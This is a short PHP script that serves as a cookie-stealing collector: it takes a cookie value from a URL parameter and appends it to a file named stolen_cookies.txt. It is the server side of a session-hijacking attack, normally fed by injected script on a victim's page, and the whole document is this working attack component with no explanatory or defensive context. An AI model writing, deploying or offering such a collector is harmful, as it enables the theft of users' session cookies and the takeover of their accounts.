<?php
$cookie = $_GET['cookie'];
file_put_contents('stolen_cookies.txt', $cookie . "\n", FILE_APPEND);
echo "OK";
?>
